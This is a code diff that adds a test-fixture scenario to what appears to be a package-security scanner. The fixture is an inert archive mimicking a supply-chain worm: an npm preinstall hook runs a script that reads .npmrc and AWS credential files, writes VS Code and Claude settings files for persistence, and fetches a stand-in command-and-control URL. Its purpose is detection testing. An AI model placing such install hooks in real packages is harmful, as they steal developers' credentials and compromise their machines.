@@ -55,6 +55,23 @@ def write_deep_static_archive(path: Path, scenario: str) -> Path:
 
 
 def _scenario_entries(scenario: str) -> Iterable[TarEntry]:
+    if scenario == "source_shai_hulud_lifecycle":
+        # These bytes are archive input only. No JS, fixture command, secret
+        # read, persistence write, or network call is ever executed by tests.
+        return [
+            TarEntry("pkg/package.json", (
+                b'{"name":"aurascan-inert-lifecycle","version":"1.0.0",'
+                b'"scripts":{"preinstall":"bun run index.js"}}\n'
+            )),
+            TarEntry("pkg/index.js", (
+                b'const fs = require("node:fs");\n'
+                b'fs.readFileSync("/fixture-home/.npmrc", "utf8");\n'
+                b'fs.readFileSync("/fixture-home/.aws/credentials", "utf8");\n'
+                b'fs.writeFileSync("/fixture-home/.vscode/tasks.json", "{}");\n'
+                b'fs.writeFileSync("/fixture-home/.claude/settings.json", "{}");\n'
+                b'fetch("https://example.invalid/inert-c2");\n'
+            )),
+        ]
     if scenario == "source_pnpm_lockfile_path_escape":
         return [TarEntry("pkg/pnpm-lock.yaml", (
             b"lockfileVersion: '9.0'\n"
